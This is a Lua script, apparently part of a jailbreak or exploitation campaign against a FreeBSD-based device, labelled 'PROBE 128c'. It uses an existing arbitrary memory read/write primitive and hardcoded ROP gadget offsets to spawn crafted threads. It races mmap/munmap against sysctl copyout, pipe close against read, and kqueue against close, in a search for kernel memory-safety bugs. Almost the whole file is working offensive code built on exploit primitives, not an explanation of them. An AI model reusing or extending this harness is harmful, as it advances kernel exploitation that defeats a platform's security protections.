-- CRASH_CLASS: MODERATE
-- PROBE 128c: mmap/munmap race — child unmaps while main does copyout
--
-- Context: 128b showed UMTX races are clean. Now testing a different code path:
-- the vm_map handling during concurrent mmap/munmap.
--
-- Attack theory: if sysctl copyout() doesn't hold the vm_map lock during the
-- copy, a concurrent munmap can remove the mapping mid-write, causing a kernel
-- page fault. On older FreeBSD, pcb_onfault catches this, but there might be
-- a window between page table removal and the fault handler setup.
--
-- Also tests: close/read race on a pipe fd.
--
-- Detection: canary (getpid), process survival, anomalous return values.

print("=== PROBE 128c: MMAP/MUNMAP + FD RACE ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l
    if type(v) == "table" and v.h then h, l = v.h, v.l
    else h, l = 0, N(v) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local sa = syscall.syscall_address
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local text_lo = rd(N(info) + 0x108) or 0
local text_hi = rd(N(info) + 0x10C) or 0
if text_lo < 0 then text_lo = text_lo + 0x100000000 end
if text_hi < 0 then text_hi = text_hi + 0x100000000 end

local function eaddr(off)
    return uint64(string.format("0x%X%08X", text_hi, text_lo + off))
end

local G = {
    ret     = 0x42,
    pop_rax = 0x992,
    pop_rsp = 0x9A2,
    pop_rdi = 0xC9DFE,
    pop_rsi = 0xD77D,
    pop_rdx = 0x3B02D7,
    pop_rcx = 0xE64,
    mov_w   = 0x92C67,
    jmp_self = 0x15481,
}

local sc_mmap = mk(477)
local sc_munmap = mk(73)
local sc_sysctl = mk(202)
local sc624 = mk(624)

-- [A] mmap/munmap race: child munmaps while main does sysctl copyout
print("[A] mmap/munmap vs sysctl copyout race")

local PAGE = 0x4000  -- 16 KB
local crashes = 0
local efaults = 0
local ok_count = 0
local dead = false
local ROUNDS = 60

for round = 1, ROUNDS do
    -- Fresh mmap each round
    local region = nil
    pcall(function()
        region = sc_mmap(uint64(0), uint64(PAGE), uint64(0x3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if region == nil then
        print("  round " .. round .. ": mmap failed")
        break
    end
    local reg_n = N(region)
    if reg_n == 0 or reg_n == 0xFFFFFFFFFFFFFFFF then
        print("  round " .. round .. ": mmap returned " .. fmt(region))
        break
    end

    -- Zero the page
    for off = 0, 0x3F8, 8 do wq(reg_n + off, uint64("0x0")) end

    -- Build child ROP chain: tight munmap loop
    local stk = memory.alloc(0x4000)
    local CB = N(stk) + 0x2000
    local ctx = memory.alloc(0x500)
    local tid_buf = memory.alloc(8)
    local BC = N(ctx)

    -- munmap(region, PAGE) in a loop
    wq(CB + 0x00, eaddr(G.pop_rax))
    wq(CB + 0x08, uint64(73))              -- munmap
    wq(CB + 0x10, eaddr(G.pop_rdi))
    wq(CB + 0x18, region)                   -- addr
    wq(CB + 0x20, eaddr(G.pop_rsi))
    wq(CB + 0x28, uint64(PAGE))             -- len
    wq(CB + 0x30, sa)                       -- syscall

    -- Write sentinel after first munmap
    wq(CB + 0x38, eaddr(G.pop_rdi))
    wq(CB + 0x40, uint64(string.format("0x%X", N(stk) + 0x100)))
    wq(CB + 0x48, eaddr(G.pop_rax))
    wq(CB + 0x50, uint64("0xAAAAAAAAAAAAAAAA"))
    wq(CB + 0x58, eaddr(G.mov_w))

    -- Continue munmap loop (mostly NOPs after first)
    wq(CB + 0x60, eaddr(G.pop_rax))
    wq(CB + 0x68, uint64(73))
    wq(CB + 0x70, eaddr(G.pop_rdi))
    wq(CB + 0x78, region)
    wq(CB + 0x80, eaddr(G.pop_rsi))
    wq(CB + 0x88, uint64(PAGE))
    wq(CB + 0x90, sa)

    wq(CB + 0x98, eaddr(G.pop_rsp))
    wq(CB + 0xA0, uint64(string.format("0x%X", CB + 0x60)))

    -- Build ucontext
    for off = 0, 0x4BC, 4 do wd(BC + off, 0) end
    wd(BC + 0x108, 0x480)
    wd(BC + 0xD0, 0)
    wd(BC + 0x110, 0x10000)
    wd(BC + 0xC0, 0x43)
    wd(BC + 0x100, 0x3B)
    local rip_lo = (text_lo + G.ret) % 0x100000000
    local rip_hi = text_hi + math.floor((text_lo + G.ret) / 0x100000000)
    wd(BC + 0xE0, rip_lo)
    wd(BC + 0xE4, rip_hi)
    local rsp_lo = CB % 0x100000000
    local rsp_hi = math.floor(CB / 0x100000000)
    wd(BC + 0xF8, rsp_lo)
    wd(BC + 0xFC, rsp_hi)

    wq(N(tid_buf), uint64("0x0"))
    local tr = nil
    pcall(function() tr = mk(430)(ctx, tid_buf, uint64(0)) end)
    if tr == nil or N(tr) ~= 0 then
        print("  round " .. round .. ": thr_create failed")
        break
    end

    -- RACE WINDOW: main does sysctl copyout to the region being unmapped
    local mib = memory.alloc(16)
    wd(N(mib), 1)     -- CTL_KERN
    wd(N(mib) + 4, 4) -- KERN_HOSTNAME (small, safe sysctl)
    local lenp = memory.alloc(8)
    wd(N(lenp), PAGE)

    for attempt = 1, 20 do
        -- Use the mmap'd region as sysctl output buffer
        local sok, srv = pcall(function()
            return sc_sysctl(uint64(N(mib)), uint64(2), region,
                uint64(N(lenp)), uint64(0), uint64(0))
        end)

        if not sok then
            crashes = crashes + 1
        elseif srv and N(srv) == -1 then
            efaults = efaults + 1
        elseif srv and N(srv) == 0 then
            ok_count = ok_count + 1
        end

        if not alive() then
            dead = true
            print(string.format("  *** DIED round=%d attempt=%d ***", round, attempt))
            break
        end
    end

    if dead then break end

    -- Let child run for a bit then continue
    for i = 1, 10 do native.fcall_with_rax(stub, 20) end

    -- Report every 10 rounds
    if round % 10 == 0 then
        print(string.format("  r=%d ok=%d efault=%d crash=%d", round, ok_count, efaults, crashes))
    end
end

if not dead then
    print(string.format("  A FINAL: ok=%d efault=%d crash=%d", ok_count, efaults, crashes))
end

if not alive() then
    print("PROCESS DEAD — POSSIBLE KERNEL BUG!")
    print("=== 128c COMPLETE (DEAD) ===")
    return
end

-- [B] Pipe close/read race — child reads from pipe while main closes it
print("")
print("[B] Pipe close/read race")

local sc_pipe = mk(42)
local sc_read = mk(3)
local sc_close = mk(6)

local pipe_ok = 0
local pipe_fail = 0
local pipe_crash = 0
local pipe_dead = false

for round = 1, 30 do
    -- Create a pipe
    local pbuf = memory.alloc(8)
    wd(N(pbuf), 0)
    wd(N(pbuf) + 4, 0)

    local pret = nil
    pcall(function() pret = sc_pipe(pbuf) end)
    if pret == nil or N(pret) ~= 0 then
        print("  pipe failed at round " .. round)
        break
    end
    local rfd = rd(N(pbuf))
    local wfd = rd(N(pbuf) + 4)
    if not rfd or rfd == 0 then
        print("  pipe returned invalid fds at round " .. round)
        break
    end

    -- Write some data to the pipe so read doesn't block
    local wbuf = memory.alloc(64)
    wq(N(wbuf), uint64("0x4141414141414141"))
    pcall(function() mk(4)(uint64(wfd), wbuf, uint64(8)) end) -- write(wfd, buf, 8)

    -- Build child ROP chain: tight read loop on rfd
    local stk2 = memory.alloc(0x4000)
    local CB2 = N(stk2) + 0x2000
    local ctx2 = memory.alloc(0x500)
    local tid2 = memory.alloc(8)
    local BC2 = N(ctx2)
    local rbuf = memory.alloc(64)

    -- read(rfd, rbuf, 8) loop
    wq(CB2 + 0x00, eaddr(G.pop_rax))
    wq(CB2 + 0x08, uint64(3))               -- read
    wq(CB2 + 0x10, eaddr(G.pop_rdi))
    wq(CB2 + 0x18, uint64(rfd))             -- fd
    wq(CB2 + 0x20, eaddr(G.pop_rsi))
    wq(CB2 + 0x28, uint64(string.format("0x%X", N(rbuf))))
    wq(CB2 + 0x30, eaddr(G.pop_rdx))
    wq(CB2 + 0x38, uint64(8))               -- count
    wq(CB2 + 0x40, sa)

    -- loop
    wq(CB2 + 0x48, eaddr(G.pop_rsp))
    wq(CB2 + 0x50, uint64(string.format("0x%X", CB2)))

    -- ucontext
    for off = 0, 0x4BC, 4 do wd(BC2 + off, 0) end
    wd(BC2 + 0x108, 0x480)
    wd(BC2 + 0xD0, 0)
    wd(BC2 + 0x110, 0x10000)
    wd(BC2 + 0xC0, 0x43)
    wd(BC2 + 0x100, 0x3B)
    wd(BC2 + 0xE0, rip_lo)
    wd(BC2 + 0xE4, rip_hi)
    local rsp2_lo = CB2 % 0x100000000
    local rsp2_hi = math.floor(CB2 / 0x100000000)
    wd(BC2 + 0xF8, rsp2_lo)
    wd(BC2 + 0xFC, rsp2_hi)

    wq(N(tid2), uint64("0x0"))
    local tr2 = nil
    pcall(function() tr2 = mk(430)(ctx2, tid2, uint64(0)) end)
    if tr2 == nil or N(tr2) ~= 0 then
        print("  thr_create failed round " .. round)
        break
    end

    -- Give child a moment to start reading
    for i = 1, 5 do native.fcall_with_rax(stub, 20) end

    -- RACE: main closes the read fd while child is reading
    local cr = nil
    local cok = pcall(function() cr = sc_close(uint64(rfd)) end)
    if not cok then pipe_crash = pipe_crash + 1
    elseif cr and N(cr) == 0 then pipe_ok = pipe_ok + 1
    else pipe_fail = pipe_fail + 1 end

    -- Also close write fd
    pcall(function() sc_close(uint64(wfd)) end)

    -- Let child spin on closed fd for a bit (returns EBADF)
    for i = 1, 20 do native.fcall_with_rax(stub, 20) end

    if not alive() then
        pipe_dead = true
        print(string.format("  *** DIED round=%d ***", round))
        break
    end

    if round % 10 == 0 then
        print(string.format("  r=%d ok=%d fail=%d crash=%d", round, pipe_ok, pipe_fail, pipe_crash))
    end
end

if not pipe_dead then
    print(string.format("  B FINAL: ok=%d fail=%d crash=%d", pipe_ok, pipe_fail, pipe_crash))
end

-- [C] kqueue event + close race
print("")
print("[C] kqueue event + close race")

local sc_kqueue = mk(362)
local sc_kevent = mk(363)

-- Create one kqueue
local kq = nil
pcall(function() kq = sc_kqueue() end)
if kq == nil or N(kq) == -1 then
    print("  kqueue failed: " .. fmt(kq))
else
    print("  kq=" .. N(kq))

    local kq_ok = 0
    local kq_err = 0
    local kq_crash = 0
    local kq_dead = false

    for round = 1, 30 do
        -- Create pipe for events
        local pbuf3 = memory.alloc(8)
        pcall(function() sc_pipe(pbuf3) end)
        local rfd3 = rd(N(pbuf3)) or 0
        local wfd3 = rd(N(pbuf3) + 4) or 0
        if rfd3 == 0 then
            print("  pipe3 failed round " .. round)
            break
        end

        -- Register EVFILT_READ on the pipe read end
        -- struct kevent: ident(8), filter(2), flags(2), fflags(4), data(8), udata(8)
        -- EVFILT_READ = -1 (0xFFFF), EV_ADD = 0x0001
        local kev_in = memory.alloc(0x20)
        wq(N(kev_in), uint64(rfd3))               -- ident = fd
        wd(N(kev_in) + 8, 0x0001FFFF)             -- filter=EVFILT_READ(-1→0xFFFF), flags=EV_ADD(1)
        wd(N(kev_in) + 12, 0)                     -- fflags
        wq(N(kev_in) + 16, uint64(0))             -- data
        wq(N(kev_in) + 24, uint64(0))             -- udata

        -- Register the event
        local kev_out = memory.alloc(0x20)
        pcall(function()
            sc_kevent(uint64(N(kq)), uint64(N(kev_in)), uint64(1),
                uint64(0), uint64(0), uint64(0))
        end)

        -- Write data to pipe to trigger read-ready
        local tw = memory.alloc(8)
        wq(N(tw), uint64("0x4242424242424242"))
        pcall(function() mk(4)(uint64(wfd3), tw, uint64(8)) end)

        -- Build child chain: close rfd3 in a tight loop
        local stk3 = memory.alloc(0x4000)
        local CB3 = N(stk3) + 0x2000
        local ctx3 = memory.alloc(0x500)
        local tid3 = memory.alloc(8)
        local BC3 = N(ctx3)

        wq(CB3 + 0x00, eaddr(G.pop_rax))
        wq(CB3 + 0x08, uint64(6))           -- close
        wq(CB3 + 0x10, eaddr(G.pop_rdi))
        wq(CB3 + 0x18, uint64(rfd3))        -- fd
        wq(CB3 + 0x20, sa)

        wq(CB3 + 0x28, eaddr(G.pop_rsp))
        wq(CB3 + 0x30, uint64(string.format("0x%X", CB3)))

        for off = 0, 0x4BC, 4 do wd(BC3 + off, 0) end
        wd(BC3 + 0x108, 0x480)
        wd(BC3 + 0xD0, 0)
        wd(BC3 + 0x110, 0x10000)
        wd(BC3 + 0xC0, 0x43)
        wd(BC3 + 0x100, 0x3B)
        wd(BC3 + 0xE0, rip_lo)
        wd(BC3 + 0xE4, rip_hi)
        local rsp3_lo = CB3 % 0x100000000
        local rsp3_hi = math.floor(CB3 / 0x100000000)
        wd(BC3 + 0xF8, rsp3_lo)
        wd(BC3 + 0xFC, rsp3_hi)

        wq(N(tid3), uint64("0x0"))
        local tr3 = nil
        pcall(function() tr3 = mk(430)(ctx3, tid3, uint64(0)) end)
        if tr3 == nil or N(tr3) ~= 0 then
            print("  thr_create3 failed round " .. round)
            pcall(function() sc_close(uint64(rfd3)) end)
            pcall(function() sc_close(uint64(wfd3)) end)
            break
        end

        -- RACE: harvest kevent while child closes the fd
        for i = 1, 10 do
            local ts = memory.alloc(16)
            wd(N(ts), 0)
            wd(N(ts) + 4, 0)
            wd(N(ts) + 8, 0)
            wd(N(ts) + 12, 0)

            local kok, kr = pcall(function()
                return sc_kevent(uint64(N(kq)), uint64(0), uint64(0),
                    uint64(N(kev_out)), uint64(1), uint64(N(ts)))
            end)

            if not kok then kq_crash = kq_crash + 1
            elseif kr and N(kr) >= 0 then kq_ok = kq_ok + 1
            else kq_err = kq_err + 1 end
        end

        pcall(function() sc_close(uint64(wfd3)) end)
        -- rfd3 should already be closed by child

        for i = 1, 10 do native.fcall_with_rax(stub, 20) end

        if not alive() then
            kq_dead = true
            print(string.format("  *** DIED round=%d ***", round))
            break
        end

        if round % 10 == 0 then
            print(string.format("  r=%d ok=%d err=%d crash=%d", round, kq_ok, kq_err, kq_crash))
        end
    end

    if not kq_dead then
        print(string.format("  C FINAL: ok=%d err=%d crash=%d", kq_ok, kq_err, kq_crash))
    end
end

-- [D] VM op counter
print("")
print("[D] Post-race state")
local vret = nil
pcall(function() vret = sc624() end)
print(string.format("  vmd=%s", vret and tostring(N(vret)) or "FAIL"))

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 128c COMPLETE ===")
